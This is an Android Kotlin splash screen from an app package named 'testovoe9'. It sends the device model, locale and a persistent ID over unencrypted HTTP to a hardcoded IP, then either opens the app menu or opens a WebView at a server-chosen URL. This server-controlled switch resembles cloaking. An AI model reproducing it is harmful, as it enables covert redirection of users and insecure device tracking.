package com.example.testovoe9

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.util.Log
import android.view.View
import android.widget.ImageView
import android.widget.ProgressBar
import androidx.appcompat.app.AlertDialog
import com.bumptech.glide.Glide
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.URL
import java.util.*

class SplashActivity : AppCompatActivity() {

    companion object {
        private const val SERVER_URL = "http://135.181.248.237/splash.php"
    }

    private lateinit var sharedPreferences: SharedPreferences

    private lateinit var progressBar: ProgressBar
    private lateinit var imageViewFon1: ImageView

    private lateinit var whatDo: String
    private lateinit var answer: String

    private var isActivityDestroyed = false

    private lateinit var uniqueId: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splash)

        progressBar = findViewById(R.id.progressBar)
        imageViewFon1 = findViewById(R.id.imageViewFon1)

        Glide.with(this)
            .load("http://135.181.248.237/9/fon1.png")
            .into(imageViewFon1)

        Glide.with(this)
            .load("http://135.181.248.237/9/fon2.png")
            .preload()

        sharedPreferences = getSharedPreferences("my_preferences", Context.MODE_PRIVATE)

        uniqueId = sharedPreferences.getString("uniqueId", "") ?: ""

        if (uniqueId.isEmpty()) {
            uniqueId = UUID.randomUUID().toString()
            sharedPreferences.edit().putString("uniqueId", uniqueId).apply()
        }

        GlobalScope.launch(Dispatchers.IO) {
            try {
                val phoneName = getPhoneName()
                val locale = Locale.getDefault().language

                val response =
                    URL("$SERVER_URL?phone_name=$phoneName&locale=$locale&unique=$uniqueId").readText()
                withContext(Dispatchers.Main) {
                    if (response.isNotEmpty()) {
                        val jsonResponse = JSONObject(response)
                        answer = jsonResponse.getString("url")
                        Log.d("AAAA", answer)
                        when (answer) {
                            "no" -> {
                                OneSignal.disablePush(false)
                                whatDo = "main"
                            }
                            "nopush" -> {
                                OneSignal.disablePush(true)
                                whatDo = "main"
                            }
                            else -> {
                                OneSignal.disablePush(false)
                                whatDo = "web"
                            }
                        }
                    } else {
                        whatDo = ""
                        val builder = AlertDialog.Builder(getApplicationContext())
                        builder.setTitle("Check Your Internet Connection")
                        builder.setMessage("Please make sure your device is connected to the internet.")
                        builder.setPositiveButton("OK") { dialog, which ->
                            recreate()
                        }
                        val dialog = builder.create()
                        dialog.show()
                    }
                }


            } catch (e: Exception) {
                whatDo = ""
            }
        }

        Handler().postDelayed({
            progressBar.visibility = View.GONE

            if (!isActivityDestroyed) {
                when (whatDo) {
                    "main" -> {
                        val intent = Intent(this, MenuActivity::class.java)
                        startActivity(intent)
                        finish()
                    }
                    "web" -> {
                        val intent = Intent(this, WebViewActivity::class.java)
                        intent.putExtra("url", answer)
                        startActivity(intent)
                        finish()
                    }
                    else -> {
                        val builder = AlertDialog.Builder(this, R.style.Theme_Testovoe9)
                        builder.setTitle("Check Your Internet Connection")
                        builder.setMessage("Please make sure your device is connected to the internet.")
                        builder.setPositiveButton("OK") { dialog, which ->
                            recreate()
                        }
                        val dialog = builder.create()
                        dialog.show()
                    }
                }
            }
        }, 3000)
    }

    override fun onDestroy() {
        super.onDestroy()
        isActivityDestroyed = true
    }

    private fun getPhoneName(): String {
        val manufacturer = android.os.Build.MANUFACTURER
        val model = android.os.Build.MODEL
        return "$manufacturer $model"
    }

}